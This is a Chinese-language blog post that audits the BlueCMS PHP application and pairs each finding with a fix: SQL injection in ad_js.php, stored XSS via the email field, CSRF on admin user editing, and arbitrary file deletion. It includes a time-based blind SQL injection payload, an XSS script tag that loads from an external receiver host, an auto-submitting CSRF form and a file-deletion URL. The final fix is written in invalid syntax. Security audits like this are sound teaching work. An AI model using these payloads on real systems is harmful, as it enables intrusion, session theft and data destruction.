<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
    <meta name="keywords" content="hexo, autumn" />
    <title>
        Hexo
    </title>
    <!-- favicon -->
    
    <link rel="icon" href="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/favicon.ico" />
     
<link rel="stylesheet" href="/css/style.css">


    <!-- highlight -->
    <link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/github-gist.min.css" />
    <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
    <script>
        hljs.initHighlightingOnLoad()
    </script>
    <script src="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-infinite-scroll@2.0.0/dist/main.js"></script>

    <script>
        infiniteScroll()

        window.addEventListener('DOMContentLoaded', function () {
            const [
                mainTitle,
                mobileMenu,
                mobileMainTitle,
                mobileMenuBtn,
                ipadMenuBtn,
                aside,
                closeBtn,
            ] = getEle(
                '#main-title',
                '.mobile-menu',
                '.mobile-menu h3',
                '.mobile-menu button',
                '.ipad-menu',
                'aside',
                'aside .close',
            )
            const io = new IntersectionObserver(entries => {
                if (entries[0].intersectionRatio <= 0) {
                    mobileMainTitle.classList.remove('invisibile')
                } else {
                    mobileMainTitle.classList.add('invisibile')
                }
            })
            io.observe(mainTitle)

            clickToggleAside(mobileMenuBtn)
            clickToggleAside(ipadMenuBtn)
            clickToggleAside(closeBtn, false)

            const isMenuVisible = window.getComputedStyle(mobileMenu).display !== 'none'
            if (isMenuVisible) document.body.style.background = 'none'

            function getEle(...args) {
                return args.map(arg => document.querySelector(arg))
            }

            function clickToggleAside(btn, show = true) {
                btn.addEventListener('click', function () {
                    if (show) {
                        aside.style.display = 'block'
                    } else {
                        aside.style.display = 'none'
                    }
                })
            }
        })
    </script>
<meta name="generator" content="Hexo 4.2.0"></head>

<body style="background: url(https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/button-bg.png) #f3f3f3">
    <div class="container">
        <header class="header">
    <nav class="mobile-menu" style="background: url(https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/button-bg.png) #f3f3f3">
        <h3 class="invisibile">
            <a href="/" class="logo">
                Hexo
            </a>
        </h3>
        <button class="menu">menu</button>
    </nav>

    <button class="ipad-menu menu">menu</button>

    <h1 class="title" id="main-title">
        <a href="/" class="logo">
            Hexo
        </a>
    </h1>
    <h2 class="desc">
        
    </h2>

    <div class="links">
        <ul>
            
            <li>
                <a href="https://github.com/FrontendSophie" target="_blank" rel="noopener">
                    Github
                </a>
            </li>
            
            <li>
                <a href="https://www.linkedin.com/in/frontendsophie/" target="_blank" rel="noopener">
                    LinkedIn
                </a>
            </li>
            
        </ul>
    </div>
</header>
        <main class="main">
            <article class="post">
    
    
    
    <h2 class="post-title">
        bluecms代码审计
    </h2>
    <ul class="post-date">
        <li>
            2019-07-18
        </li>
        <li>
            M1nzhi
        </li>
    </ul>
    <div class="post-content">
        <h4 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h4><p>ad_js.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_BLUE'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/include/common.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ad[<span class="string">'time_set'</span>] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$ad_content = $ad[<span class="string">'content'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getone</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql, $type=MYSQL_ASSOC)</span></span>&#123;</span><br><span class="line">	$query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">	$row = mysql_fetch_array($query, $type);</span><br><span class="line">	<span class="keyword">return</span> $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>common.fun.php 使用了deep_addslashes对单双引号做转义处理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($str))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($str <span class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">		&#123;</span><br><span class="line">			$str[$key] = deep_addslashes($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$str = addslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里转义做的很不错，但是问题出在ad_js.php中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad &#x3D; $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id &#x3D;&quot;.$ad_id);</span><br></pre></td></tr></table></figure>

<p>这里变量$ad_id并没有申明是数字型还是字符型，换而言之，我根本不需要使用单引号即可实现注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id &#x3D; 1 and if(ascii(substring((select database()),1,1))&gt;97,sleep(3),1)</span><br></pre></td></tr></table></figure>

<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><p>这里进行强制类型转换就可以了：intval</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad &#x3D; $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#39;ad&#39;).&quot; WHERE ad_id &#x3D;&quot;.intval($ad_id));</span><br></pre></td></tr></table></figure>

<h4 id="2-store-xss"><a href="#2-store-xss" class="headerlink" title="2.  store xss"></a>2.  store xss</h4><p>输出点:/admin/user.php 14行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($act==<span class="string">'list'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$perpage = <span class="string">'20'</span>;</span><br><span class="line">	$page = <span class="keyword">new</span> page(<span class="keyword">array</span>(<span class="string">'total'</span>=&gt;get_total(<span class="string">"SELECT COUNT(*) AS num FROM "</span>.table(<span class="string">'user'</span>)), <span class="string">'perpage'</span>=&gt;$perpage));</span><br><span class="line">	$currenpage=$page-&gt;nowindex;</span><br><span class="line">	$offset=($currenpage<span class="number">-1</span>)*$perpage;</span><br><span class="line"></span><br><span class="line">	$user_list=get_list(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'user'</span>).<span class="string">" ORDER BY reg_time DESC"</span>, $offset, $perpage);</span><br><span class="line"></span><br><span class="line">	template_assign(<span class="keyword">array</span>(<span class="string">'user_list'</span>, <span class="string">'page'</span>), <span class="keyword">array</span>($user_list, $page-&gt;show(<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">	$smarty-&gt;display(<span class="string">'user.htm'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>user.htm</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">"datalist"</span> <span class="attr">onmousemove</span>=<span class="string">"javascript:this.bgColor='#F7FBFE';"</span> <span class="attr">onmouseout</span>=<span class="string">"javascript:this.bgColor='#FFFFFF';"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;#$user_list[user].user_name#&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;#if $user.sex == 0#&#125;保密&#123;#elseif $user.sex == 1#&#125;男&#123;#else#&#125;女&#123;#/if#&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;#$user_list[user].email#&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;#$user_list[user].birthday#&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;#$user_list[user].reg_time|date_format:"%Y-%m-%e"#&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"user.php?act=edit&amp;user_id=&#123;#$user_list[user].user_id#&#125;"</span>&gt;</span>编辑<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="symbol">&amp;nbsp;</span>|<span class="symbol">&amp;nbsp;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"user.php?act=del&amp;user_id=&#123;#$user_list[user].user_id#&#125;"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>user_name,email,birthday,reg_time</p>
<p>输入点:user.php 764行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'edit_user_info'</span>)&#123;</span><br><span class="line"> $user_id = intval($_SESSION[<span class="string">'user_id'</span>]);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>($user_id))&#123;</span><br><span class="line">	 <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line">$birthday = trim($_POST[<span class="string">'birthday'</span>]);</span><br><span class="line">$sex = intval($_POST[<span class="string">'sex'</span>]);</span><br><span class="line">   $email = !<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>]) ? trim($_POST[<span class="string">'email'</span>]) : <span class="string">''</span>;</span><br><span class="line">   $msn = !<span class="keyword">empty</span>($_POST[<span class="string">'msn'</span>]) ? trim($_POST[<span class="string">'msn'</span>]) : <span class="string">''</span>;</span><br><span class="line">   $qq = !<span class="keyword">empty</span>($_POST[<span class="string">'qq'</span>]) ? trim($_POST[<span class="string">'qq'</span>]) : <span class="string">''</span>;</span><br><span class="line">   $mobile_phone = !<span class="keyword">empty</span>($_POST[<span class="string">'mobile_phone'</span>]) ? trim($_POST[<span class="string">'mobile_phone'</span>]) : <span class="string">''</span>;</span><br><span class="line">   $office_phone = !<span class="keyword">empty</span>($_POST[<span class="string">'office_phone'</span>]) ? trim($_POST[<span class="string">'office_phone'</span>]) : <span class="string">''</span>;</span><br><span class="line">   $home_phone   = !<span class="keyword">empty</span>($_POST[<span class="string">'home_phone'</span>]) ? trim($_POST[<span class="string">'home_phone'</span>]) : <span class="string">''</span>;</span><br><span class="line">$address = !<span class="keyword">empty</span>($_POST[<span class="string">'address'</span>]) ? htmlspecialchars($_POST[<span class="string">'address'</span>]) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'face_pic1'</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span> (strpos($_POST[<span class="string">'face_pic1'</span>], <span class="string">'http://'</span>) != <span class="keyword">false</span> &amp;&amp; strpos($_POST[<span class="string">'face_pic1'</span>], <span class="string">'https://'</span>) != <span class="keyword">false</span>)&#123;</span><br><span class="line">          showmsg(<span class="string">'只支持本站相对路径地址'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          $face_pic = trim($_POST[<span class="string">'face_pic1'</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(file_exists(BLUE_ROOT.$_POST[<span class="string">'face_pic3'</span>]))&#123;</span><br><span class="line">		@unlink(BLUE_ROOT.$_POST[<span class="string">'face_pic3'</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'face_pic2'</span>][<span class="string">'error'</span>]) &amp;&amp; $_FILES[<span class="string">'face_pic2'</span>][<span class="string">'error'</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">	$face_pic = $image-&gt;img_upload($_FILES[<span class="string">'face_pic2'</span>],<span class="string">'face_pic'</span>);</span><br><span class="line">&#125;</span><br><span class="line">   $face_pic = <span class="keyword">empty</span>($face_pic) ? <span class="string">''</span> : $face_pic;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"UPDATE "</span>.table(<span class="string">'user'</span>).<span class="string">" SET birthday = '$birthday', sex = '$sex', face_pic = '$face_pic', email = '$email', msn = '$msn', qq = '$qq',"</span> .</span><br><span class="line">		<span class="string">" mobile_phone = '$mobile_phone', office_phone = '$office_phone', home_phone = '$home_phone', address='$address' WHERE user_id = "</span>.intval($_SESSION[<span class="string">'user_id'</span>]);</span><br><span class="line">$db-&gt;query($sql);</span><br><span class="line">showmsg(<span class="string">'更新个人资料成功'</span>, <span class="string">'user.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只有777行的 $address对输入做了编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$address = !<span class="keyword">empty</span>($_POST[<span class="string">'address'</span>]) ? htmlspecialchars($_POST[<span class="string">'address'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$birthday = trim($_POST[<span class="string">'birthday'</span>]);</span><br><span class="line">$sex = intval($_POST[<span class="string">'sex'</span>]);</span><br><span class="line">$email = !<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>]) ? trim($_POST[<span class="string">'email'</span>]) : <span class="string">''</span>;</span><br><span class="line">$msn = !<span class="keyword">empty</span>($_POST[<span class="string">'msn'</span>]) ? trim($_POST[<span class="string">'msn'</span>]) : <span class="string">''</span>;</span><br><span class="line">$qq = !<span class="keyword">empty</span>($_POST[<span class="string">'qq'</span>]) ? trim($_POST[<span class="string">'qq'</span>]) : <span class="string">''</span>;</span><br><span class="line">$mobile_phone = !<span class="keyword">empty</span>($_POST[<span class="string">'mobile_phone'</span>]) ? trim($_POST[<span class="string">'mobile_phone'</span>]) : <span class="string">''</span>;</span><br><span class="line">$office_phone = !<span class="keyword">empty</span>($_POST[<span class="string">'office_phone'</span>]) ? trim($_POST[<span class="string">'office_phone'</span>]) : <span class="string">''</span>;</span><br><span class="line">$home_phone   = !<span class="keyword">empty</span>($_POST[<span class="string">'home_phone'</span>]) ? trim($_POST[<span class="string">'home_phone'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure>

<p>对比一下输入和输入：</p>
<p>输出 <code>user_name,sex,email,birthday,reg_time</code></p>
<p>输入<code>$birthday, $sex,$email,$msn,$qq,$mobile_phone,$office_phone,$home_phone,$address</code></p>
<p>输入&amp;输出 <code>email，sex,birthday</code></p>
<p>sex和birthday都不是varchar类型，最后只有email了</p>
<p>email设置为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCrIpt srC&#x3D;&#x2F;&#x2F;xs.sb&#x2F;YJll&gt;&lt;&#x2F;sCRipT&gt;</span><br></pre></td></tr></table></figure>

<p>xss接收</p>
<p><img src="/2019/07/18/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/0622-2.jpg" alt></p>
<p>除了email之外，user_name本应该也可以实现xss攻击</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|user_name       | varchar(40)      | NO   |     | NULL</span><br></pre></td></tr></table></figure>

<p>但是在用户注册的时候，程序就判断了用户名长度</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($user_name) &lt; <span class="number">4</span> || strlen($user_name) &gt; <span class="number">16</span>)&#123;</span><br><span class="line">		showmsg(<span class="string">'用户名字符长度不符'</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>因为无法构造出字符串长度小于等于16的xss payload，虽然有漏洞，但是无法利用</p>
<h5 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h5><p>作者既然对address进行了html编码，想不通为什么不对所有用户输入都做编码呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$email &#x3D; !empty($_POST[&#39;email&#39;]) ? trim(htmlspecialchars($_POST[&#39;email&#39;])) : &#39;&#39;;</span><br></pre></td></tr></table></figure>

<h4 id="3-csrf"><a href="#3-csrf" class="headerlink" title="3. csrf"></a>3. csrf</h4><p>漏洞文件：/admin/user.php</p>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">elseif</span>($act == <span class="string">'do_edit'</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> 	$password = !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>]) ? trim($_POST[<span class="string">'password'</span>]) : <span class="string">''</span> ;</span><br><span class="line"> 	$email = !<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>]) ? trim($_POST[<span class="string">'email'</span>]) : <span class="string">''</span> ;</span><br><span class="line">	$money = !<span class="keyword">empty</span>($_POST[<span class="string">'money'</span>]) ? $_POST[<span class="string">'money'</span>] : <span class="string">'0.00'</span>;</span><br><span class="line">    ......</span><br><span class="line">     </span><br><span class="line"> 	<span class="keyword">if</span>(!<span class="keyword">empty</span>($password))&#123;</span><br><span class="line">		$sql = <span class="string">"UPDATE "</span>.table(<span class="string">'user'</span>).<span class="string">" SET pwd=md5('$password'),email='$email',sex='$sex',birthday='$birthday',address='$address',msn='$msn',qq='$qq',office_phone='$office_phone',home_phone='$home_phone',mobile_phone='$mobile_phone', money='$money' WHERE user_id="</span>.intval($_POST[<span class="string">'user_id'</span>]);</span><br><span class="line">   ......</span><br><span class="line">       </span><br><span class="line"> 	$db-&gt;query($sql);</span><br><span class="line"> 	showmsg(<span class="string">'编辑会员信息成功'</span>,<span class="string">'user.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$act=do_edit , $act=do_del ,$act=do_add都存在csrf漏洞</p>
<p>利用一下代码测试成功</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form id=<span class="string">"form1"</span> method=<span class="string">"POST"</span>  action=<span class="string">" http://bluecms.cc/admin/user.php"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"act"</span> value=<span class="string">"do_edit"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_id"</span> value=<span class="string">"3"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"66"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(<span class="string">"form1"</span>).submit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h5><p>在提交数据前做token验证</p>
<p>common.inc.php 生成token</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_SESSION[<span class="string">'token'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (function_exists(<span class="string">'mcrypt_create_iv'</span>)) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>] = bin2hex(mcrypt_create_iv(<span class="number">32</span>, MCRYPT_DEV_URANDOM));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>] = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$token = $_SESSION[<span class="string">'token'</span>];</span><br></pre></td></tr></table></figure>

<p>在方法前验证token，/admin/user.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'token'</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span> (hash_equals($_SESSION[<span class="string">'token'</span>], $_POST[<span class="string">'token'</span>]))&#123;</span><br><span class="line">			$db-&gt;query($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Access Denied!'</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-web目录下任意文件删除"><a href="#4-web目录下任意文件删除" class="headerlink" title="4.web目录下任意文件删除"></a>4.web目录下任意文件删除</h4><p>user.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'del_pic'</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 	$id = $_REQUEST[<span class="string">'id'</span>];</span><br><span class="line"> 	$db-&gt;query(<span class="string">"DELETE FROM "</span>.table(<span class="string">'post_pic'</span>).</span><br><span class="line"> 				<span class="string">" WHERE pic_path='$id'"</span>);</span><br><span class="line"> 	<span class="keyword">if</span>(file_exists(BLUE_ROOT.$id))</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		@unlink(BLUE_ROOT.$id);</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bluecms.cc&#x2F;publish.php?act&#x3D;del_pic&amp;id&#x3D;images&#x2F;ddd.txt</span><br></pre></td></tr></table></figure>

<p>$act=edit_user_info下也存在一样的问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'edit_user_info'</span>)&#123;</span><br><span class="line">此处省略。。。</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'face_pic1'</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span> (strpos($_POST[<span class="string">'face_pic1'</span>], <span class="string">'http://'</span>) != <span class="keyword">false</span> &amp;&amp; strpos($_POST[<span class="string">'face_pic1'</span>], <span class="string">'https://'</span>) != <span class="keyword">false</span>)&#123;</span><br><span class="line">          showmsg(<span class="string">'只支持本站相对路径地址'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          $face_pic = trim($_POST[<span class="string">'face_pic1'</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(file_exists(BLUE_ROOT.$_POST[<span class="string">'face_pic3'</span>]))&#123;</span><br><span class="line">		@unlink(BLUE_ROOT.$_POST[<span class="string">'face_pic3'</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h5><p>做文件删除操作前，对身份进行判断，不允许非admin账号删除文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> $_SESSION[<span class="string">'user_name'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">	@unlink(BLUE_ROOT.$id);</span><br></pre></td></tr></table></figure>


    </div>
</article>
        </main>
        <aside class="aside">
            <div class="close"></div>
            <section class="aside-section">
                
    <h1>Categories</h1>

